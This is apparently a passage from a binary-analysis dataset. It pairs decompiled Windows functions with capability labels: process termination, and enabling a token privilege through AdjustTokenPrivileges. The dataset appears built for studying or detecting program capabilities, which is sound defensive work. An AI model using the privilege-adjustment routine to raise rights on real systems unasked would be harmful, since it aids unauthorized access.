        "decompiled_code": "\nvoid __fastcall fcn.00407951(uint *param_1)\n\n{\n    int32_t *piVar1;\n    code *pcVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    if ((param_1[2] != 0x7fff55aa) && (iVar3 = param_1[2] + -1,  param_1[2] = iVar3,  iVar3 < 1)) {\n        *param_1 = *(in_EAX + 4);\n        *(in_EAX + 0x20) = *(in_EAX + 0x20) + 1;\n        piVar1 = in_EAX + 0x1c;\n        *piVar1 = *piVar1 + -1;\n        *(in_EAX + 4) = param_1;\n        if (*piVar1 < 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0xff);\n            pcVar2 = swi(3);\n            (*pcVar2)();\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 238
    },
    "004094f2": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004094f2(void)\n\n{\n    code *pcVar1;\n    \n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0xff);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 56
    },
    "00403dc0": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403dc0(uint lpName)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint NewState;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpLuid;\n    uint var_ch;\n    int32_t TokenHandle;\n    \n    uVar3 = 0;\n    TokenHandle = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20, &TokenHandle);\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, lpName, &lpLuid);\n        if (iVar2 != 0) {\n            var_1ch = lpLuid;\n            var_18h = var_ch;\n            NewState = 1;\n            var_14h = 2;\n            uVar3 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)(TokenHandle, 0, &NewState, 0, 0, 0);\n        }\n    }\n    if (TokenHandle != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n    }\n    return uVar3;\n}\n",
        "token_count": 303
    }
}